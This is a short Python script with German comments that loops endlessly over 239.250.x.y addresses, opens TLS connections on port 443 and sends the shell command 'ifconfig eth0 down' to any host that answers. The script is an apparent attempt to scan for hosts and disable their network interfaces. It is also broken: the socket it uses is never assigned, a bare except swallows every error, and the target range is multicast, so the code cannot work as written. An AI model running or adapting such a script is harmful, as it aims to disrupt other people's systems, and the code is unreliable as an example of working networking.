import socket
import ssl
import platform
import subprocess 


while (1):
# Host und Port des Servers
	for i in range(255):
		for j in range(255):
				host = f'239.250.{i}.{j}'
				try:
					port = 443  # Standard-Port für HTTPS
					ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), ssl_version=ssl.PROTOCOL_TLS).connect((host, port))
					ssl_sock.do_handshake()
					ssl_sock.sendall(b'ifconfig eth0 down" ')
					print(host + ":443 success")
					
				except:
					continue
